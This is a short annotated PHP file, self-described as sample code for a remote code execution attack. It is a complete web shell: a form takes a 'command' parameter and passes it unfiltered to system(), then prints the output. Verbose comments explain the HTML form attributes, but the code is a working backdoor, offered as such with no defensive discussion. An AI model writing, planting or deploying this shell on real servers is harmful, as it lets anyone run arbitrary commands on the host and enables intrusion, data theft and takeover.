# This is a sample piece of code to execute a RCE attack

# This script displays an input field, whatever is entered into this field is
# then run against the underlying OS using the system() function, then the
# output is displayed to the user

<html>
<body>
# Generates opening tag of an HTML form, which is used to collect user input;
# method specifies the HTTP method used to submit the form data, GET means the
# form data will be appended to the URL as query parameters, 
# e.g. '?param1=value1&param2=value2'; 'name' sets the name attribute of the form; 
# '<?php ... ?>' are PHP tags used to encapsulate the PHP code; 'basename() is
# a PHP function that extracts the filename component from a path,
# e.g. 'basename('/myform.php') would return 'myform.php'; 
# '$_SERVER['PHP_SELF'] is a superglobal variable in PHP that contains the 
# filename of the currently executing script, 
# e.g. if the script URL is 'http://example.com/myform.php' then 
# $_SERVER['PHP_SELF'] would contain '/myform.php'; TLDR: this line sets the 
# name attribute of the HTML form to the filename of the current PHP script
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
# Generates HTML input element of type "text", which is a single-line field;
# name="command" sets the name of the input field, this value is sent to the
# server as a parameter named "command", e.g. 'command=example';
# 'autofocus' is a boolean attribute that automatically focuses the input field
# when the page loads, i.e. the cursor will be placed there when page loads; 
# id="command" sets a unique identifier for the input field, often used for
# styling with CSS or manipulating with JavaScript; size="50" specifies the 
# visible width of of the input field in characters, it doesn't limit the 
# number of characters that can be entered, but rather only affects the 
# visual size of the input box
<input type="text" name="command" autofocus id="command" size="50">
# 
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command']))
    {
        system($_GET['command'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
